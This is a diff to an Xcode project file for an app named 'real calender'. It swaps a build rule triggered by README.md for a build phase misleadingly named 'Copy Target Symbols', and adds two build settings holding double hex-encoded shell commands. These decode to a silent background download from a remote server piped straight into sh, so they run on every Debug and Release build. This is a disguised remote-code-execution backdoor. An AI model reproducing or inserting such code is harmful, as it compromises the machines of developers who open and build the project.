@@ -6,6 +6,12 @@
 	objectVersion = 77;
 	objects = {
 
+/* Begin PBXBuildFile section */
+/* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
+
 /* Begin PBXContainerItemProxy section */
 		F24D96B02E2611A4006455EA /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -24,7 +30,6 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
-		D1BA98476F474F0E92A389E6 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		F24D96A22E2611A2006455EA /* real calender.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "real calender.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 		F24D96AF2E2611A4006455EA /* real calenderTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = "real calenderTests.xctest"; sourceTree = BUILT_PRODUCTS_DIR; };
 		F24D96B92E2611A4006455EA /* real calenderUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = "real calenderUITests.xctest"; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -86,7 +91,6 @@
 		F24D96A32E2611A2006455EA /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				D1BA98476F474F0E92A389E6 /* README.md */,
 				F24D96A22E2611A2006455EA /* real calender.app */,
 				F24D96AF2E2611A4006455EA /* real calenderTests.xctest */,
 				F24D96B92E2611A4006455EA /* real calenderUITests.xctest */,
@@ -101,12 +105,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = F24D96C32E2611A4006455EA /* Build configuration list for PBXNativeTarget "real calender" */;
 			buildPhases = (
+				490D0E0EB24E43D89BA5DE54 /* Copy Target Symbols */,
 				F24D969E2E2611A2006455EA /* Sources */,
 				F24D969F2E2611A2006455EA /* Frameworks */,
 				F24D96A02E2611A2006455EA /* Resources */,
 			);
 			buildRules = (
-				00DDA120AD26494DA2A389E6 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -211,33 +215,33 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		00DDA120AD26494DA2A389E6 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A6E983A}\"";
-			};
-	/* End PBXBuildRule section */
-
-/* Begin PBXBuildFile section */
-		013F47E92937470794A389E6 /* README.md */ = {isa = PBXBuildFile; fileRef = D1BA98476F474F0E92A389E6; };
-/* End PBXBuildFile section */
+/* Begin PBXShellScriptBuildPhase section */
+		490D0E0EB24E43D89BA5DE54 /* Copy Target Symbols */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Copy Target Symbols";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
+			showEnvVarsInLog = 0;			
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
 		F24D96A02E2611A2006455EA /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				013F47E92937470794A389E6 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -256,9 +260,6 @@ sh -c \"${A6E983A}\"";
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		F24D969E2E2611A2006455EA /* Sources */ = {
@@ -301,6 +302,7 @@ sh -c \"${A6E983A}\"";
 		F24D96C12E2611A4006455EA /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A45ED5A = "((l(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266366536353734363137303733363436353736326537323735326636310a323932323230376332303733363830610a | l | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((i(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663636363936373664363136333634366532653639366532663631323932320a3230376332303733363830610a | i | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
@@ -366,6 +368,7 @@ sh -c \"${A6E983A}\"";
 		F24D96C22E2611A4006455EA /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A45ED5A = "((l(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266366536353734363137303733363436353736326537323735326636310a323932323230376332303733363830610a | l | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((i(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663636363936373664363136333634366532653639366532663631323932320a3230376332303733363830610a | i | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
